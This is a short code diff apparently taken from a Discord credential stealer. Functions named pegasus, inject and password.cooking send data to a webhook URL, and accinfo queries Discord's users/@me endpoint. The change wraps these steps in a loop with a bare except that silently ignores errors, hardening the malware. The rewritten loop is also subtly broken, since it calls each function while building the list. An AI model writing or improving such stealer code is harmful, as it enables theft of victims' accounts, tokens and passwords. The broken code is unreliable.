@@ -53,10 +53,14 @@ def main(webhook_url):
     cleanup()
 
 def pegasus():
-    main(WEBHOOK_URL)
-    inject(WEBHOOK_URL)
-    password.cooking()
-     
+    for func in [main(WEBHOOK_URL),
+                inject(WEBHOOK_URL),
+                password.cooking()]:
+        try:
+            func()
+        except:
+            pass
+
 def accinfo():
     r = requests.get(
         'https://discord.com/api/v9/users/@me',
